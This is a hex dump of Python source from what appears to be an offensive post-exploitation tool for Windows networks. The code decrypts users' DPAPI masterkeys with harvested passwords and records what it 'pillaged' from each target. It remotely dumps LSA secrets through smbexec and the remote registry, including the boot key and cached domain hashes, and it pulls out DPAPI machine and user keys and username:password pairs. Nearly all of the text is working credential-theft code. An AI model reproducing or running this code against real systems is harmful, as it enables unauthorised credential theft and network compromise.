-00016100: 2e63 7265 647a 5b75 7365 726e 616d 655d  .credz[username]
-00016110: 0a09 0909 0909 0909 6d79 6f70 7469 6f6e  ........myoption
-00016120: 732e 7369 6420 3d20 7573 6572 2e73 6964  s.sid = user.sid
-00016130: 0a09 0909 0909 0909 6d79 6f70 7469 6f6e  ........myoption
-00016140: 732e 7076 6b20 3d20 4e6f 6e65 0a09 0909  s.pvk = None....
-00016150: 0909 0909 6d79 6f70 7469 6f6e 732e 6b65  ....myoptions.ke
-00016160: 7920 3d20 4e6f 6e65 0a09 0909 0909 0909  y = None........
-00016170: 6d79 6470 6170 6920 3d20 4450 4150 4928  mydpapi = DPAPI(
-00016180: 6d79 6f70 7469 6f6e 732c 2073 656c 662e  myoptions, self.
-00016190: 6c6f 6767 696e 6729 0a09 0909 0909 0909  logging)........
-000161a0: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
-000161b0: 6b65 7920 3d20 6d79 6470 6170 692e 6465  key = mydpapi.de
-000161c0: 6372 7970 745f 6d61 7374 6572 6b65 7928  crypt_masterkey(
-000161d0: 7061 7373 776f 7264 733d 7365 6c66 2e6f  passwords=self.o
-000161e0: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
-000161f0: 726e 616d 655d 290a 0909 0909 0909 0969  rname])........i
-00016200: 6620 6465 6372 7970 7465 645f 6d61 7374  f decrypted_mast
-00016210: 6572 6b65 7920 213d 202d 3120 616e 6420  erkey != -1 and 
-00016220: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
-00016230: 6b65 7920 213d 204e 6f6e 653a 0a09 0909  key != None:....
-00016240: 0909 0909 0923 2073 656c 662e 6c6f 6767  .....# self.logg
-00016250: 696e 672e 6465 6275 6728 6622 5b7b 7365  ing.debug(f"[{se
-00016260: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00016270: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-00016280: 4f4b 4752 4545 4e7d 4465 6372 7970 7469  OKGREEN}Decrypti
-00016290: 6f6e 2073 7563 6365 7373 6675 6c6c 207b  on successfull {
-000162a0: 6263 6f6c 6f72 732e 454e 4443 7d3a 207b  bcolors.ENDC}: {
-000162b0: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
-000162c0: 6b65 797d 2229 0a09 0909 0909 0909 0975  key}").........u
-000162d0: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
-000162e0: 696c 655b 6775 6964 5d5b 2773 7461 7475  ile[guid]['statu
-000162f0: 7327 5d20 3d20 2764 6563 7279 7074 6564  s'] = 'decrypted
-00016300: 270a 0909 0909 0909 0909 7573 6572 2e6d  '.........user.m
-00016310: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
-00016320: 7569 645d 5b27 6b65 7927 5d20 3d20 6465  uid]['key'] = de
-00016330: 6372 7970 7465 645f 6d61 7374 6572 6b65  crypted_masterke
-00016340: 790a 0909 0909 0909 0909 2320 7573 6572  y.........# user
-00016350: 2e6d 6173 7465 726b 6579 735b 6c6f 6361  .masterkeys[loca
-00016360: 6c66 696c 655d 203d 2064 6563 7279 7074  lfile] = decrypt
-00016370: 6564 5f6d 6173 7465 726b 6579 0a09 0909  ed_masterkey....
-00016380: 0909 0909 0975 7365 722e 7479 7065 203d  .....user.type =
-00016390: 2027 4c4f 4341 4c27 0a09 0909 0909 0909   'LOCAL'........
-000163a0: 0975 7365 722e 7479 7065 5f76 616c 6964  .user.type_valid
-000163b0: 6174 6564 203d 2054 7275 650a 0909 0909  ated = True.....
-000163c0: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-000163d0: 2e64 6562 7567 280a 0909 0909 0909 0909  .debug(.........
-000163e0: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
-000163f0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
-00016400: 636f 6c6f 7273 2e4f 4b42 4c55 457d 4465  colors.OKBLUE}De
-00016410: 6372 7970 7469 6f6e 2073 7563 6365 7373  cryption success
-00016420: 6675 6c6c 207b 6263 6f6c 6f72 732e 454e  full {bcolors.EN
-00016430: 4443 7d20 6f66 204d 6173 7465 726b 6579  DC} of Masterkey
-00016440: 207b 6775 6964 7d20 666f 7220 5573 6572   {guid} for User
-00016450: 207b 6263 6f6c 6f72 732e 4f4b 4752 4545   {bcolors.OKGREE
-00016460: 4e7d 207b 7573 6572 2e75 7365 726e 616d  N} {user.usernam
-00016470: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
-00016480: 2020 5c6e 4b65 793a 207b 6465 6372 7970    \nKey: {decryp
-00016490: 7465 645f 6d61 7374 6572 6b65 797d 2229  ted_masterkey}")
-000164a0: 0a09 0909 0909 0909 0973 656c 662e 6462  .........self.db
-000164b0: 2e75 7064 6174 655f 6d61 7374 6572 6b65  .update_masterke
-000164c0: 7928 6669 6c65 5f70 6174 683d 7573 6572  y(file_path=user
-000164d0: 2e6d 6173 7465 726b 6579 735f 6669 6c65  .masterkeys_file
-000164e0: 5b67 7569 645d 5b27 7061 7468 275d 2c20  [guid]['path'], 
-000164f0: 6775 6964 3d67 7569 642c 0a09 0909 0909  guid=guid,......
-00016500: 0909 0909 0909 0909 0920 7374 6174 7573  ......... status
-00016510: 3d75 7365 722e 6d61 7374 6572 6b65 7973  =user.masterkeys
-00016520: 5f66 696c 655b 6775 6964 5d5b 2773 7461  _file[guid]['sta
-00016530: 7475 7327 5d2c 0a09 0909 0909 0909 0909  tus'],..........
-00016540: 0909 0909 0920 6465 6372 7970 7465 645f  ..... decrypted_
-00016550: 7769 7468 3d66 2250 6173 7377 6f72 643a  with=f"Password:
-00016560: 7b73 656c 662e 6f70 7469 6f6e 732e 6372  {self.options.cr
-00016570: 6564 7a5b 7573 6572 6e61 6d65 5d7d 222c  edz[username]}",
-00016580: 0a09 0909 0909 0909 0909 0909 0909 0920  ............... 
-00016590: 6465 6372 7970 7465 645f 7661 6c75 653d  decrypted_value=
-000165a0: 6465 6372 7970 7465 645f 6d61 7374 6572  decrypted_master
-000165b0: 6b65 792c 0a09 0909 0909 0909 0909 0909  key,............
-000165c0: 0909 0920 7069 6c6c 6167 6564 5f66 726f  ... pillaged_fro
-000165d0: 6d5f 636f 6d70 7574 6572 5f69 703d 7365  m_computer_ip=se
-000165e0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-000165f0: 745f 6970 2c0a 0909 0909 0909 0909 0909  t_ip,...........
-00016600: 0909 0909 2070 696c 6c61 6765 645f 6672  .... pillaged_fr
-00016610: 6f6d 5f75 7365 726e 616d 653d 7573 6572  om_username=user
-00016620: 2e75 7365 726e 616d 6529 0a09 0909 0909  .username)......
-00016630: 0909 0972 6574 7572 6e20 7573 6572 2e6d  ...return user.m
-00016640: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
-00016650: 7569 645d 0a09 0909 0909 0909 656c 7365  uid]........else
-00016660: 3a0a 0909 0909 0909 0909 7365 6c66 2e6c  :.........self.l
-00016670: 6f67 6769 6e67 2e64 6562 7567 280a 0909  ogging.debug(...
-00016680: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00016690: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-000166a0: 707d 5d20 6572 726f 7220 6465 6372 7970  p}] error decryp
-000166b0: 7469 6e67 207b 6263 6f6c 6f72 732e 4f4b  ting {bcolors.OK
-000166c0: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
-000166d0: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
-000166e0: 437d 206d 6173 7465 726b 6579 2020 7b67  C} masterkey  {g
-000166f0: 7569 647d 2077 6974 6820 7b6c 656e 2873  uid} with {len(s
-00016700: 656c 662e 6f70 7469 6f6e 732e 6372 6564  elf.options.cred
-00016710: 7a5b 7573 6572 6e61 6d65 5d29 7d20 7061  z[username])} pa
-00016720: 7373 776f 7264 7320 6672 6f6d 2075 7365  sswords from use
-00016730: 7220 7b75 7365 726e 616d 657d 2069 6e20  r {username} in 
-00016740: 6372 6564 206c 6973 7422 290a 0909 0909  cred list").....
-00016750: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
-00016760: 6f6e 2061 7320 6578 3a0a 0909 0909 0909  on as ex:.......
-00016770: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-00016780: 6275 6728 0a09 0909 0909 0909 0966 225b  bug(.........f"[
-00016790: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-000167a0: 7267 6574 5f69 707d 5d20 4578 6365 7074  rget_ip}] Except
-000167b0: 2064 6563 7279 7074 696e 6720 7b62 636f   decrypting {bco
-000167c0: 6c6f 7273 2e4f 4b42 4c55 457d 7b75 7365  lors.OKBLUE}{use
-000167d0: 722e 7573 6572 6e61 6d65 7d7b 6263 6f6c  r.username}{bcol
-000167e0: 6f72 732e 454e 4443 7d20 6d61 7374 6572  ors.ENDC} master
-000167f0: 6b65 7920 7769 7468 207b 6c65 6e28 7365  key with {len(se
-00016800: 6c66 2e6f 7074 696f 6e73 2e63 7265 647a  lf.options.credz
-00016810: 5b75 7365 726e 616d 655d 297d 2070 6173  [username])} pas
-00016820: 7377 6f72 6473 2066 726f 6d20 7573 6572  swords from user
-00016830: 207b 7573 6572 6e61 6d65 7d20 696e 2063   {username} in c
-00016840: 7265 6420 6c69 7374 2229 0a09 0909 0909  red list")......
-00016850: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-00016860: 6562 7567 2865 7829 0a09 0909 0965 6c73  ebug(ex).....els
-00016870: 653a 0a09 0909 0909 7365 6c66 2e6c 6f67  e:......self.log
-00016880: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
-00016890: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-000168a0: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
-000168b0: 6263 6f6c 6f72 732e 4641 494c 7d6e 6f20  bcolors.FAIL}no 
-000168c0: 6372 6564 656e 7469 616c 2069 6e20 6372  credential in cr
-000168d0: 6564 7a20 6669 6c65 2066 6f72 2075 7365  edz file for use
-000168e0: 7220 7b75 7365 722e 7573 6572 6e61 6d65  r {user.username
-000168f0: 7d20 616e 6420 6d61 7374 6572 6b65 7920  } and masterkey 
-00016900: 7b67 7569 647d 207b 6263 6f6c 6f72 732e  {guid} {bcolors.
-00016910: 454e 4443 7d22 290a 0909 0974 6573 7465  ENDC}")....teste
-00016920: 645f 7479 7065 2e61 7070 656e 6428 274c  d_type.append('L
-00016930: 4f43 414c 2729 0a09 0909 6966 2075 7365  OCAL')....if use
-00016940: 722e 6d61 7374 6572 6b65 7973 5f66 696c  r.masterkeys_fil
-00016950: 655b 6775 6964 5d5b 2773 7461 7475 7327  e[guid]['status'
-00016960: 5d20 3d3d 2027 656e 6372 7970 7465 6427  ] == 'encrypted'
-00016970: 3a0a 0909 0909 6966 2027 444f 4d41 494e  :.....if 'DOMAIN
-00016980: 2720 6e6f 7420 696e 2074 6573 7465 645f  ' not in tested_
-00016990: 7479 7065 3a0a 0909 0909 0972 6574 7572  type:......retur
-000169a0: 6e20 7365 6c66 2e64 6563 7279 7074 5f6d  n self.decrypt_m
-000169b0: 6173 7465 726b 6579 2875 7365 722c 2067  asterkey(user, g
-000169c0: 7569 642c 2027 444f 4d41 494e 272c 2074  uid, 'DOMAIN', t
-000169d0: 6573 7465 645f 7479 7065 3d74 6573 7465  ested_type=teste
-000169e0: 645f 7479 7065 290a 0909 0909 656c 6966  d_type).....elif
-000169f0: 2027 4d41 4348 494e 4527 206e 6f74 2069   'MACHINE' not i
-00016a00: 6e20 7465 7374 6564 5f74 7970 653a 0a09  n tested_type:..
-00016a10: 0909 0909 7265 7475 726e 2073 656c 662e  ....return self.
-00016a20: 6465 6372 7970 745f 6d61 7374 6572 6b65  decrypt_masterke
-00016a30: 7928 7573 6572 2c20 6775 6964 2c20 274d  y(user, guid, 'M
-00016a40: 4143 4849 4e45 272c 2074 6573 7465 645f  ACHINE', tested_
-00016a50: 7479 7065 3d74 6573 7465 645f 7479 7065  type=tested_type
-00016a60: 290a 0909 0909 656c 6966 2027 4d41 4348  ).....elif 'MACH
-00016a70: 494e 452d 5553 4552 2720 6e6f 7420 696e  INE-USER' not in
-00016a80: 2074 6573 7465 645f 7479 7065 3a0a 0909   tested_type:...
-00016a90: 0909 0972 6574 7572 6e20 7365 6c66 2e64  ...return self.d
-00016aa0: 6563 7279 7074 5f6d 6173 7465 726b 6579  ecrypt_masterkey
-00016ab0: 2875 7365 722c 2067 7569 642c 2027 4d41  (user, guid, 'MA
-00016ac0: 4348 494e 452d 5553 4552 272c 2074 6573  CHINE-USER', tes
-00016ad0: 7465 645f 7479 7065 3d74 6573 7465 645f  ted_type=tested_
-00016ae0: 7479 7065 290a 0a09 0909 2320 6f6e 2061  type).....# on a
-00016af0: 2070 6173 2073 7520 6c65 2064 6563 6869   pas su le dechi
-00016b00: 6666 7265 722c 206d 6169 7320 6f6e 2063  ffrer, mais on c
-00016b10: 6f6e 7365 7665 206c 6120 6d61 7374 6572  onseve la master
-00016b20: 6b65 790a 0909 0927 2727 6966 206c 6f63  key....'''if loc
-00016b30: 616c 6669 6c65 206e 6f74 2069 6e20 7573  alfile not in us
-00016b40: 6572 2e6d 6173 7465 726b 6579 733a 0a09  er.masterkeys:..
-00016b50: 0909 0975 7365 722e 6d61 7374 6572 6b65  ...user.masterke
-00016b60: 7973 5b6c 6f63 616c 6669 6c65 5d20 3d20  ys[localfile] = 
-00016b70: 4e6f 6e65 2727 270a 0909 0969 6620 7573  None'''....if us
-00016b80: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
-00016b90: 6c65 5b67 7569 645d 5b27 7374 6174 7573  le[guid]['status
-00016ba0: 275d 203d 3d20 2765 6e63 7279 7074 6564  '] == 'encrypted
-00016bb0: 273a 0a09 0909 0975 7365 722e 6d61 7374  ':.....user.mast
-00016bc0: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
-00016bd0: 5d5b 2773 7461 7475 7327 5d20 3d20 2764  ]['status'] = 'd
-00016be0: 6563 7279 7074 696f 6e5f 6661 696c 6564  ecryption_failed
-00016bf0: 270a 0909 0909 7365 6c66 2e64 622e 7570  '.....self.db.up
-00016c00: 6461 7465 5f6d 6173 7465 726b 6579 2866  date_masterkey(f
-00016c10: 696c 655f 7061 7468 3d75 7365 722e 6d61  ile_path=user.ma
-00016c20: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
-00016c30: 6964 5d5b 2770 6174 6827 5d2c 2067 7569  id]['path'], gui
-00016c40: 643d 6775 6964 2c0a 0909 0909 0909 0909  d=guid,.........
-00016c50: 0909 2073 7461 7475 733d 7573 6572 2e6d  .. status=user.m
-00016c60: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
-00016c70: 7569 645d 5b27 7374 6174 7573 275d 2c20  uid]['status'], 
-00016c80: 6465 6372 7970 7465 645f 7769 7468 3d27  decrypted_with='
-00016c90: 272c 0a09 0909 0909 0909 0909 0920 6465  ',........... de
-00016ca0: 6372 7970 7465 645f 7661 6c75 653d 2727  crypted_value=''
-00016cb0: 2c0a 0909 0909 0909 0909 0909 2070 696c  ,........... pil
-00016cc0: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
-00016cd0: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
-00016ce0: 6f6e 732e 7461 7267 6574 5f69 702c 0a09  ons.target_ip,..
-00016cf0: 0909 0909 0909 0909 0920 7069 6c6c 6167  ......... pillag
-00016d00: 6564 5f66 726f 6d5f 7573 6572 6e61 6d65  ed_from_username
-00016d10: 3d75 7365 722e 7573 6572 6e61 6d65 290a  =user.username).
-00016d20: 0909 0909 7265 7475 726e 202d 310a 0909  ....return -1...
-00016d30: 0965 6c69 6620 7573 6572 2e6d 6173 7465  .elif user.maste
-00016d40: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
-00016d50: 5b27 7374 6174 7573 275d 203d 3d20 2764  ['status'] == 'd
-00016d60: 6563 7279 7074 6564 273a 2020 2320 5368  ecrypted':  # Sh
-00016d70: 6f75 6c64 276e 7420 676f 2068 6572 650a  ould'nt go here.
-00016d80: 0909 0909 7265 7475 726e 2075 7365 722e  ....return user.
-00016d90: 6d61 7374 6572 6b65 7973 5f66 696c 655b  masterkeys_file[
-00016da0: 6775 6964 5d0a 0a09 6465 6620 7465 7374  guid]...def test
-00016db0: 5f72 656d 6f74 654f 7073 2873 656c 6629  _remoteOps(self)
-00016dc0: 3a0a 0909 7472 793a 0a09 0909 2320 5265  :...try:....# Re
-00016dd0: 6d6f 7665 206c 6f67 6769 6e67 0a09 0909  move logging....
-00016de0: 2320 6c6f 6767 696e 672e 6765 744c 6f67  # logging.getLog
-00016df0: 6765 7228 292e 7365 744c 6576 656c 286c  ger().setLevel(l
-00016e00: 6f67 6769 6e67 2e43 5249 5449 4341 4c29  ogging.CRITICAL)
-00016e10: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-00016e20: 2e69 6e66 6f28 6622 5b7b 7365 6c66 2e6f  .info(f"[{self.o
-00016e30: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-00016e40: 7d5d 207b 6263 6f6c 6f72 732e 4f4b 424c  }] {bcolors.OKBL
-00016e50: 5545 7d20 5b2b 5d20 4475 6d70 696e 6720  UE} [+] Dumping 
-00016e60: 4c53 4120 5365 6372 6574 737b 6263 6f6c  LSA Secrets{bcol
-00016e70: 6f72 732e 454e 4443 7d22 290a 0a09 0909  ors.ENDC}").....
-00016e80: 7365 6c66 2e5f 5f72 656d 6f74 654f 7073  self.__remoteOps
-00016e90: 203d 204d 7952 656d 6f74 654f 7065 7261   = MyRemoteOpera
-00016ea0: 7469 6f6e 7328 7365 6c66 2e73 6d62 2c20  tions(self.smb, 
-00016eb0: 7365 6c66 2e6f 7074 696f 6e73 2e6b 2c20  self.options.k, 
-00016ec0: 7365 6c66 2e6f 7074 696f 6e73 2e64 635f  self.options.dc_
-00016ed0: 6970 290a 0909 0973 656c 662e 5f5f 7265  ip)....self.__re
-00016ee0: 6d6f 7465 4f70 732e 7365 7445 7865 634d  moteOps.setExecM
-00016ef0: 6574 686f 6428 2773 6d62 6578 6563 2729  ethod('smbexec')
-00016f00: 0a09 0909 7365 6c66 2e5f 5f72 656d 6f74  ....self.__remot
-00016f10: 654f 7073 2e65 6e61 626c 6552 6567 6973  eOps.enableRegis
-00016f20: 7472 7928 290a 0909 0973 656c 662e 5f5f  try()....self.__
-00016f30: 626f 6f74 4b65 7920 3d20 7365 6c66 2e5f  bootKey = self._
-00016f40: 5f72 656d 6f74 654f 7073 2e67 6574 426f  _remoteOps.getBo
-00016f50: 6f74 4b65 7928 290a 0909 0973 656c 662e  otKey()....self.
-00016f60: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
-00016f70: 626f 6f74 6b65 793a 207b 7365 6c66 2e5f  bootkey: {self._
-00016f80: 5f62 6f6f 744b 6579 7d22 290a 0909 0953  _bootKey}")....S
-00016f90: 4543 5552 4954 5946 696c 654e 616d 6520  ECURITYFileName 
-00016fa0: 3d20 7365 6c66 2e5f 5f72 656d 6f74 654f  = self.__remoteO
-00016fb0: 7073 2e73 6176 6553 4543 5552 4954 5928  ps.saveSECURITY(
-00016fc0: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
-00016fd0: 672e 6465 6275 6728 2273 6176 6573 6563  g.debug("savesec
-00016fe0: 7572 6974 7922 290a 0909 0973 656c 662e  urity")....self.
-00016ff0: 5f5f 4c53 4153 6563 7265 7473 203d 204d  __LSASecrets = M
-00017000: 794c 5341 5365 6372 6574 7328 5345 4355  yLSASecrets(SECU
-00017010: 5249 5459 4669 6c65 4e61 6d65 2c20 7365  RITYFileName, se
-00017020: 6c66 2e5f 5f62 6f6f 744b 6579 2c20 7365  lf.__bootKey, se
-00017030: 6c66 2e5f 5f72 656d 6f74 654f 7073 2c20  lf.__remoteOps, 
-00017040: 6973 5265 6d6f 7465 3d54 7275 652c 0a09  isRemote=True,..
-00017050: 0909 0909 0909 0909 0909 2068 6973 746f  .......... histo
-00017060: 7279 3d54 7275 6529 0a09 0909 7365 6c66  ry=True)....self
-00017070: 2e6c 6f67 6769 6e67 2e64 6562 7567 2822  .logging.debug("
-00017080: 4c53 4153 6563 7265 7422 290a 0909 0973  LSASecret")....s
-00017090: 656c 662e 5f5f 4c53 4153 6563 7265 7473  elf.__LSASecrets
-000170a0: 2e64 756d 7043 6163 6865 6448 6173 6865  .dumpCachedHashe
-000170b0: 7328 290a 0909 0973 656c 662e 6c6f 6767  s()....self.logg
-000170c0: 696e 672e 6465 6275 6728 2264 756d 7020  ing.debug("dump 
-000170d0: 6361 6368 6564 2068 6173 6865 7322 290a  cached hashes").
-000170e0: 0909 0973 656c 662e 5f5f 4c53 4153 6563  ...self.__LSASec
-000170f0: 7265 7473 2e64 756d 7053 6563 7265 7473  rets.dumpSecrets
-00017100: 2829 0a0a 0909 0966 696c 6564 6573 7420  ().....filedest 
-00017110: 3d20 6f73 2e70 6174 682e 6a6f 696e 286f  = os.path.join(o
-00017120: 732e 7061 7468 2e6a 6f69 6e28 7365 6c66  s.path.join(self
-00017130: 2e6f 7074 696f 6e73 2e6f 7574 7075 745f  .options.output_
-00017140: 6469 7265 6374 6f72 792c 2073 656c 662e  directory, self.
-00017150: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00017160: 7029 2c20 274c 5341 2729 0a09 0909 5061  p), 'LSA')....Pa
-00017170: 7468 286f 732e 7061 7468 2e73 706c 6974  th(os.path.split
-00017180: 2866 696c 6564 6573 742e 7265 706c 6163  (filedest.replac
-00017190: 6528 275c 5c27 2c20 272f 2729 295b 305d  e('\\', '/'))[0]
-000171a0: 292e 6d6b 6469 7228 7061 7265 6e74 733d  ).mkdir(parents=
-000171b0: 5472 7565 2c20 6578 6973 745f 6f6b 3d54  True, exist_ok=T
-000171c0: 7275 6529 0a09 0909 7365 6c66 2e6c 6f67  rue)....self.log
-000171d0: 6769 6e67 2e64 6562 7567 2866 225b 7b73  ging.debug(f"[{s
-000171e0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-000171f0: 6574 5f69 707d 5d20 4475 6d70 696e 6720  et_ip}] Dumping 
-00017200: 4c53 4120 5365 6372 6574 7320 746f 2066  LSA Secrets to f
-00017210: 696c 6520 7b66 696c 6564 6573 747d 2229  ile {filedest}")
-00017220: 0a09 0909 6669 6e61 6c66 696c 6520 3d20  ....finalfile = 
-00017230: 7365 6c66 2e5f 5f4c 5341 5365 6372 6574  self.__LSASecret
-00017240: 732e 6578 706f 7274 5365 6372 6574 7328  s.exportSecrets(
-00017250: 6669 6c65 6465 7374 290a 0909 0973 656c  filedest)....sel
-00017260: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00017270: 2272 6574 2066 696c 6520 2573 2220 2520  "ret file %s" % 
-00017280: 6669 6e61 6c66 696c 6529 0a09 0909 7365  finalfile)....se
-00017290: 6c66 2e5f 5f4c 5341 5365 6372 6574 732e  lf.__LSASecrets.
-000172a0: 6578 706f 7274 4361 6368 6564 2866 696c  exportCached(fil
-000172b0: 6564 6573 7429 0a09 0923 2041 6e61 6c79  edest)...# Analy
-000172c0: 7365 7220 6c65 7320 6861 7368 2044 4343  ser les hash DCC
-000172d0: 3220 706f 7572 2075 6e20 6578 706f 7274  2 pour un export
-000172e0: 206d 6173 7369 662e 0a09 0965 7863 6570   massif....excep
-000172f0: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-00017300: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
-00017310: 6e67 2e64 6562 7567 280a 0909 0909 6622  ng.debug(.....f"
-00017320: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00017330: 6172 6765 745f 6970 7d5d 2045 7863 6570  arget_ip}] Excep
-00017340: 7420 7265 6d6f 7465 4f70 7320 4c53 4122  t remoteOps LSA"
-00017350: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
-00017360: 672e 6465 6275 6728 6578 290a 0909 7472  g.debug(ex)...tr
-00017370: 793a 0a09 0909 746d 705f 6669 6c65 6465  y:....tmp_filede
-00017380: 7374 203d 2066 696c 6564 6573 7420 2b20  st = filedest + 
-00017390: 272e 7365 6372 6574 7327 0a09 0909 6620  '.secrets'....f 
-000173a0: 3d20 6f70 656e 2874 6d70 5f66 696c 6564  = open(tmp_filed
-000173b0: 6573 742c 2027 7262 2729 0a09 0909 7365  est, 'rb')....se
-000173c0: 6372 6574 7320 3d20 662e 7265 6164 2829  crets = f.read()
-000173d0: 2e73 706c 6974 2862 275c 6e27 290a 0909  .split(b'\n')...
-000173e0: 0966 2e63 6c6f 7365 2829 0a09 0909 666f  .f.close()....fo
-000173f0: 7220 696e 6465 782c 2073 6563 7265 7420  r index, secret 
-00017400: 696e 2065 6e75 6d65 7261 7465 2873 6563  in enumerate(sec
-00017410: 7265 7473 293a 0a09 0909 0969 6620 6227  rets):.....if b'
-00017420: 6470 6170 695f 6d61 6368 696e 656b 6579  dpapi_machinekey
-00017430: 2720 696e 2073 6563 7265 743a 0a09 0909  ' in secret:....
-00017440: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
-00017450: 6e66 6f28 0a09 0909 0909 0966 225b 7b73  nfo(.......f"[{s
-00017460: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00017470: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
-00017480: 2e4f 4b42 4c55 457d 5b2d 5d20 466f 756e  .OKBLUE}[-] Foun
-00017490: 6420 4450 4150 4920 4d61 6368 696e 6520  d DPAPI Machine 
-000174a0: 6b65 797b 6263 6f6c 6f72 732e 454e 4443  key{bcolors.ENDC
-000174b0: 7d20 3a20 7b73 6563 7265 742e 7370 6c69  } : {secret.spli
-000174c0: 7428 6227 6470 6170 695f 6d61 6368 696e  t(b'dpapi_machin
-000174d0: 656b 6579 3a27 295b 315d 2e64 6563 6f64  ekey:')[1].decod
-000174e0: 6528 2775 7466 2d38 2729 7d22 290a 0909  e('utf-8')}")...
-000174f0: 0909 0923 2070 7269 6e74 2873 6563 7265  ...# print(secre
-00017500: 742e 7370 6c69 7428 6227 6470 6170 695f  t.split(b'dpapi_
-00017510: 6d61 6368 696e 656b 6579 3a27 295b 315d  machinekey:')[1]
-00017520: 290a 0909 0909 0973 656c 662e 6d61 6368  )......self.mach
-00017530: 696e 655f 6b65 792e 6170 7065 6e64 2873  ine_key.append(s
-00017540: 6563 7265 742e 7370 6c69 7428 6227 6470  ecret.split(b'dp
-00017550: 6170 695f 6d61 6368 696e 656b 6579 3a27  api_machinekey:'
-00017560: 295b 315d 290a 0909 0909 0973 656c 662e  )[1])......self.
-00017570: 6c6f 6767 696e 672e 6465 6275 6728 7365  logging.debug(se
-00017580: 6c66 2e6d 6163 6869 6e65 5f6b 6579 290a  lf.machine_key).
-00017590: 0909 0909 6966 2062 2764 7061 7069 5f75  ....if b'dpapi_u
-000175a0: 7365 726b 6579 2720 696e 2073 6563 7265  serkey' in secre
-000175b0: 743a 0a09 0909 0909 7365 6c66 2e6c 6f67  t:......self.log
-000175c0: 6769 6e67 2e69 6e66 6f28 0a09 0909 0909  ging.info(......
-000175d0: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
-000175e0: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
-000175f0: 636f 6c6f 7273 2e4f 4b42 4c55 457d 5b2d  colors.OKBLUE}[-
-00017600: 5d20 466f 756e 6420 4450 4150 4920 5573  ] Found DPAPI Us
-00017610: 6572 206b 6579 7b62 636f 6c6f 7273 2e45  er key{bcolors.E
-00017620: 4e44 437d 203a 207b 7365 6372 6574 2e73  NDC} : {secret.s
-00017630: 706c 6974 2862 2764 7061 7069 5f75 7365  plit(b'dpapi_use
-00017640: 726b 6579 3a27 295b 315d 2e64 6563 6f64  rkey:')[1].decod
-00017650: 6528 2775 7466 2d38 2729 7d22 290a 0909  e('utf-8')}")...
-00017660: 0909 0973 656c 662e 7573 6572 5f6b 6579  ...self.user_key
-00017670: 2e61 7070 656e 6428 7365 6372 6574 2e73  .append(secret.s
-00017680: 706c 6974 2862 2764 7061 7069 5f75 7365  plit(b'dpapi_use
-00017690: 726b 6579 3a27 295b 315d 290a 0909 0909  rkey:')[1]).....
-000176a0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-000176b0: 6275 6728 7365 6c66 2e75 7365 725f 6b65  bug(self.user_ke
-000176c0: 7929 0a09 0909 0969 6620 6227 3a27 2069  y).....if b':' i
-000176d0: 6e20 7365 6372 6574 3a0a 0909 0909 0969  n secret:......i
-000176e0: 6620 7365 6372 6574 2e63 6f75 6e74 2862  f secret.count(b
-000176f0: 273a 2729 203d 3d20 313a 0a09 0909 0909  ':') == 1:......
-00017700: 0975 7365 726e 616d 652c 2070 6173 7377  .username, passw
-00017710: 6f72 6420 3d20 7365 6372 6574 2e73 706c  ord = secret.spl
-00017720: 6974 2862 273a 2729 0a09 0909 0909 0969  it(b':').......i
